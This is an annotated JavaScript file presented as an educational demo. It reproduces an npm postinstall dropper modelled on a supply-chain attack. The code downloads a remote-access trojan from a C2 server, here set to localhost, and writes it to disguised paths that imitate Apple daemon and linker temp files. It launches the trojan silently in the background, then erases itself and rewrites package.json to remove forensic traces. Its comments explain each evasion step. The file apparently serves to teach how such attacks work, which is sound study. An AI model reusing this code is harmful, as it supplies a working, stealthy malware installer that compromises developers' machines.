/**
 * Dropper — Educational Demo
 *
 * Mimics the postinstall hook from plain-crypto-js@4.2.1.
 * This script runs automatically when `npm install` is executed.
 *
 * What it does:
 *   1. Detects the OS
 *   2. Downloads rat.js from the C2 server (GET /payload)
 *   3. Writes it to a disguised path
 *   4. Launches it detached in background
 *   5. Deletes itself (setup.js)
 *   6. Overwrites package.json with a clean stub (no postinstall hook)
 *
 * ANNOTATION: This is the most critical piece. After it runs, npm ls shows
 * a perfectly clean package — the hook is gone, setup.js is gone.
 * The only trace is the RAT process running in the background.
 */

const http = require("http");
const fs = require("fs");
const path = require("path");
const { spawn } = require("child_process");
const os = require("os");

const C2_HOST = "localhost";
const C2_PORT = 8000;

/**
 * ANNOTATION: Disguised drop paths per OS.
 *
 * macOS: /Library/Caches/com.apple.act.mond.js
 *   → /Library/Caches/ is world-writable, no sudo needed
 *   → "com.apple.act.mond" mimics Apple daemon naming (activitymonitord)
 *   → In the real attack, it was a compiled binary, not .js
 *
 * Windows: %TEMP%\wt.js — looks like a Windows Terminal temp file
 * Linux:   /tmp/ld.js   — looks like a linker temp file
 */
function getDropPath() {
  switch (os.platform()) {
    case "darwin":
      return "/tmp/com.apple.act.mond.js"; // Using /tmp for demo (no /Library/Caches write issues)
    case "win32":
      return path.join(os.tmpdir(), "wt.js");
    default:
      return "/tmp/ld.js";
  }
}

/**
 * Download the RAT payload from C2.
 *
 * ANNOTATION: In the real attack, the dropper POSTed to an endpoint that
 * looked like packages.npm.org/product0 — designed to blend in with npm
 * registry traffic in network logs. We use a simple GET /payload here.
 */
function downloadPayload() {
  return new Promise((resolve, reject) => {
    const req = http.get(
      `http://${C2_HOST}:${C2_PORT}/payload`,
      (res) => {
        let data = "";
        res.on("data", (chunk) => (data += chunk));
        res.on("end", () => resolve(data));
      }
    );
    req.on("error", reject);
    req.setTimeout(5000, () => {
      req.destroy();
      reject(new Error("timeout"));
    });
  });
}

/**
 * Clean up all evidence:
 *   1. Delete this script (setup.js)
 *   2. Overwrite package.json with a clean version (no postinstall hook)
 *
 * ANNOTATION: After this runs, `cat node_modules/plain-crypto-js/package.json`
 * shows a perfectly innocent package. `npm ls` shows nothing suspicious.
 * The postinstall hook is gone. setup.js is gone. Zero forensic traces
 * in the package directory.
 */
function cleanUp() {
  // Overwrite package.json with clean stub
  const cleanPkg = {
    name: "plain-crypto-js",
    version: "4.2.1",
    description: "JavaScript library of crypto standards",
    main: "index.js",
  };

  const pkgPath = path.join(__dirname, "package.json");
  fs.writeFileSync(pkgPath, JSON.stringify(cleanPkg, null, 2) + "\n");

  // Write a dummy index.js so require() doesn't fail
  const indexPath = path.join(__dirname, "index.js");
  if (!fs.existsSync(indexPath)) {
    fs.writeFileSync(indexPath, "// plain-crypto-js stub\nmodule.exports = {};\n");
  }

  // Delete this script
  // ANNOTATION: fs.unlinkSync(__filename) — the dropper erases itself
  try {
    fs.unlinkSync(__filename);
  } catch {
    // might fail on Windows if file is locked; that's fine for demo
  }
}

// ── Main ────────────────────────────────────────────────────────────────────

async function main() {
  try {
    // Step 1: Download the RAT
    const payload = await downloadPayload();

    // Step 2: Write to disguised path
    const dropPath = getDropPath();
    fs.writeFileSync(dropPath, payload);

    // Step 3: Launch detached in background
    /**
     * ANNOTATION: detached: true + unref()
     *
     * `detached: true` — the child process runs in a new session, so it
     * survives when the parent (npm install) exits.
     *
     * `stdio: 'ignore'` — no stdin/stdout/stderr attached, so no output
     * leaks to the terminal.
     *
     * `.unref()` — tells Node.js not to wait for this child before exiting.
     *
     * Combined: the RAT runs invisibly in the background. The user sees
     * a normal `npm install` output with zero indication that a process
     * was spawned.
     */
    const child = spawn("node", [dropPath], {
      detached: true,
      stdio: "ignore",
    });
    child.unref();

    // Step 4: Clean up evidence
    cleanUp();
  } catch (err) {
    // ANNOTATION: Silent failure — if C2 is down, nothing happens.
    // The npm install succeeds normally. No error, no trace.
    // This is intentional: better to fail silently than alert the victim.
    cleanUp();
  }
}

main();
